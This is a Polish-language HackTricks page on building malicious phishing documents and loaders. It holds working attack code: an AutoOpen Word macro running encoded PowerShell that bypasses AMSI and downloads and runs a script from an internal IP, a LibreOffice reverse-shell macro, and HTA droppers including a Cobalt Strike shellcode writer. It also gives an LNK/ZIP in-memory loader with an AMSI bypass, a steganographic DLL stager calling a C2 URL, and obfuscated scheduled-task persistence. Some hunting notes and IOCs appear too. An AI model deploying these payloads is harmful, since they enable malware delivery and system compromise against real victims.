# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się poprzez identyfikację struktury danych względem standardu OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.

Zazwyczaj pliki Word zawierające macros używają rozszerzenia `.docm`. Możliwe jest jednak przemianowanie pliku poprzez zmianę rozszerzenia i zachowanie jego możliwości wykonywania macros.\
Na przykład plik RTF domyślnie nie obsługuje macros, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie umożliwiał wykonywanie macros.\
Te same mechanizmy wewnętrzne dotyczą całego oprogramowania z pakietu Microsoft Office (Excel, PowerPoint itd.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
```bash
assoc | findstr /i "word excel powerp"
```
Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go), który zawiera macros, mogą również „wykonywać” macros.

### Ładowanie zewnętrznego obrazu

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture oraz **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Ładowanie zewnętrznego obrazu: Przejdź do: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor makr

Możliwe jest użycie makr do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje autoload

Im częściej są używane, tym większe prawdopodobieństwo, że AV je wykryje.

- AutoOpen()
- Document_Open()

#### Przykłady kodu makr
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy inspektora dokumentu. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz menu rozwijane **Save as type** i zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
Zrób to, ponieważ **nie można zapisywać makr w pliku `.docx`**, a rozszerzenie obsługujące makra **`.docm`** jest **źle postrzegane** **ze względu** na makra (np. ikona miniatury ma duży znak `!`, a niektóre bramy internetowe/pocztowe całkowicie je blokują). Dlatego to **starsze rozszerzenie `.doc` jest najlepszym kompromisem**.

#### Generatory złośliwych makr

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Automatycznie uruchamiane makra LibreOffice ODT (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic i automatycznie je wykonywać po otwarciu pliku, przypisując makro do zdarzenia **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda następująco:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz stringa – LibreOffice Basic używa ich do oznaczania literalnych cudzysłowów, dlatego payloady kończące się na `...==""")` zachowują równowagę zarówno wewnętrznego polecenia, jak i argumentu Shell.

Wskazówki dotyczące dostarczania:

- Zapisz jako `.odt` i przypisz makro do zdarzenia dokumentu, aby uruchamiało się natychmiast po otwarciu.
- Wysyłając wiadomość e-mail za pomocą `swaks`, użyj `--attach @resume.odt` (`@` jest wymagany, aby jako załącznik zostały wysłane bajty pliku, a nie ciąg znaków zawierający nazwę pliku). Ma to kluczowe znaczenie podczas nadużywania serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez walidacji.

## Pliki HTA

HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja o **pełnym zaufaniu**, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest wykonywany za pomocą **`mshta.exe`**, który jest zazwyczaj **instalowany** razem z **Internet Explorerem**, co oznacza, że **`mshta` jest zależny od IE**. Jeśli więc zostanie on odinstalowany, HTA nie będzie można uruchomić.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów na **zdalne wymuszenie uwierzytelniania NTLM** — można na przykład dodać **niewidoczne obrazy** do wiadomości e-mail lub kodu HTML, który użytkownik otworzy (nawet za pośrednictwem HTTP MitM). Można też wysłać ofierze **adresy plików**, które **wyzwolą** **uwierzytelnianie** już przy **otwieraniu folderu**.

**Sprawdź te i inne pomysły na poniższych stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że można nie tylko wykraść hash lub dane uwierzytelniające, ale także **przeprowadzać ataki NTLM relay**:

- [**Ataki NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloady osadzone w ZIP (fileless chain)

Wysoce skuteczne kampanie dostarczają plik ZIP zawierający dwa legalne dokumenty wabikowe (PDF/DOCX) oraz złośliwy plik .lnk. Sztuczka polega na tym, że właściwy PowerShell loader jest przechowywany w surowych bajtach ZIP-a za unikalnym markerem, a plik .lnk wycina go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przebieg implementowany przez jednolinijkowy skrypt PowerShell w pliku .lnk:

1) Zlokalizuj oryginalny plik ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz w katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP-a i znajdź hardcoded marker (np. xFIQCV). Wszystko za markerem jest osadzonym PowerShell payloadem.
3) Skopiuj ZIP do %ProgramData%, wypakuj go w tym miejscu i otwórz wabikowy plik .docx, aby zachować pozory legalności.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskacja kolejnego etapu (np. usunięcie wszystkich znaków #) i wykonanie go w pamięci.

Przykładowy szkielet PowerShell do wycięcia i uruchomienia osadzonego etapu:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notatki
- Delivery często wykorzystuje subdomeny renomowanych PaaS (np. *.herokuapp.com) i może filtrować payloady (serwować nieszkodliwe pliki ZIP na podstawie IP/UA).
- Kolejny etap często odszyfrowuje shellcode zakodowany w base64/XOR i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby ograniczyć artefakty na dysku.

Persistence użyte w tym samym łańcuchu
- Przejęcie COM TypeLib kontrolki Microsoft Web Browser, dzięki czemu IE/Explorer lub dowolna aplikacja osadzająca tę kontrolkę automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia commands znajdują się tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Pliki ZIP zawierające marker ASCII (np. xFIQCV) dołączony na końcu danych archiwum.
- Plik .lnk, który przeszukuje foldery nadrzędne/użytkownika w celu znalezienia pliku ZIP i otwiera dokument będący przynętą.
- Manipulowanie AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.

## Staging typu LNK decoy-first → persistence przez scheduled task → trusted CPL side-loading

Innym powtarzającym się wzorcem jest **plik `.lnk` podszywający się pod dokument**, który natychmiast otwiera nieszkodliwą przynętę, jednocześnie przygotowując w tle właściwy łańcuch.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i używa `conhost.exe` lub podobnego proxy do uruchomienia obfuskowanego PowerShell downloadera.
2. PowerShell dzieli oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), przez co proste mechanizmy detekcji szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie wykrywają command.
3. Stager najpierw pobiera **dokument będący przynętą**, otwiera go dla ofiary, a następnie odtwarza złośliwe pliki w tle.
4. Payloady mogą być zapisywane z **fałszywymi rozszerzeniami**, a następnie zmieniane przez usunięcie znaków wypełniających, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **scheduled task uruchamianego co minutę**, który uruchamia zaufany host binary ze ścieżki zapisywalnej przez użytkownika.

Minimalne wskazówki huntingowe wynikające z tego wzorca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Przydatny układ stagingu do rozpoznania:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` lub `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego drugi etap jest ukryty

W analizie przypadku Rapid7 zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ obok niego umieszczono **`APPWIZ.cpl`**, eksportujący **`RunFODW`**, zaufany plik binarny Microsoft ładował attacker CPL zamiast legalnej kopii systemowej.

CPL następnie:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pośrednictwem **Windows CNG / `bcrypt.dll`**
- Alokuje pamięć wykonywalną i kopiuje odszyfrowany shellcode
- Uruchamia go pośrednio, przekazując wskaźnik shellcode jako callback dla **`EnumUILanguagesW`**

Ten ostatni krok warto analizować osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legitimate callback-taking WinAPI**, aby przekazać wykonanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie w pełni mapował finalny PE w pamięci oraz patchował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem wykonania. Bardziej szczegółowe informacje o side-loadingu i przetwarzaniu post-processing w pamięci znajdują się tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne punkty do analizy:
- `.lnk` uruchamiające `powershell.exe` lub `conhost.exe`, a następnie widoczny dokument-wabik.
- Krótkotrwałe pobrania do **`C:\Users\Public\`**, po których następuje natychmiastowa zmiana nazw z użyciem nonsensownych rozszerzeń.
- Zaplanowane zadania o neutralnych nazwach, takich jak `GoogleErrorReport`, uruchamiane z **katalogów zapisywalnych przez użytkownika**.
- Zaufane pliki binarne ładujące pliki **`.cpl` / `.dll`** z tego samego niestandardowego katalogu.
- Bloby tekstowe Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez side-loaded module.

## Payloady ograniczone steganograficznie w obrazach (PowerShell stager)

Nowsze łańcuchy loaderów dostarczają zaciemniony JavaScript/VBS, który dekoduje i uruchamia PowerShell stager. Stager pobiera obraz (często GIF) zawierający zakodowaną w Base64 bibliotekę .NET DLL ukrytą jako zwykły tekst pomiędzy unikalnymi znacznikami początku i końca. Skrypt wyszukuje te delimitery (przykłady zaobserwowane w środowisku: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst znajdujący się pomiędzy nimi, dekoduje go z Base64 do bajtów, ładuje assembly w pamięci i wywołuje znaną metodę wejściową z adresem URL C2.<sup>[[5]](#references)</sup>

Przebieg
- Etap 1: Zarchiwizowany JS/VBS dropper → dekoduje osadzony Base64 → uruchamia PowerShell stager z parametrami -nop -w hidden -ep bypass.
- Etap 2: PowerShell stager → pobiera obraz, wycina Base64 ograniczony markerami, ładuje bibliotekę .NET DLL w pamięci i wywołuje jej metodę (np. VAI), przekazując URL C2 oraz opcje.
- Etap 3: Loader pobiera finalny payload i zazwyczaj wstrzykuje go za pomocą process hollowing do zaufanego pliku binarnego (często MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej informacji o process hollowing i proxy execution z użyciem zaufanych narzędzi znajduje się tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShell wycinający DLL z obrazu i wywołujący metodę .NET w pamięci:

<details>
<summary>Extractor i loader PowerShell dla stego payloadu</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notatki
- Jest to ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markery różnią się między kampaniami.
- Obejście AMSI/ETW i deobfuskacja ciągów są często stosowane przed załadowaniem assembly.
- Hunting: skanuj pobrane obrazy pod kątem znanych delimiterów; identyfikuj PowerShell uzyskujący dostęp do obrazów i natychmiast dekodujący bloby Base64.

Zobacz także narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Powtarzającym się etapem początkowym jest mały, silnie zaciemniony plik `.js` lub `.vbs` dostarczony w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z opcjami `-nop -w hidden -ep bypass` w celu zainicjowania następnego etapu przez HTTPS.<sup>[[5]](#references)</sup>

Logika szkieletowa (abstrakcyjna):
- Odczytaj zawartość własnego pliku
- Zlokalizuj blob Base64 między ciągami śmieciowymi
- Zdekoduj do PowerShell w ASCII
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, wywołując `powershell.exe`

Wskazówki do huntingu
- Załączniki JS/VBS w archiwach uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w linii poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Pliki Windows do kradzieży hashy NTLM

Sprawdź stronę dotyczącą **miejsc do kradzieży poświadczeń NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
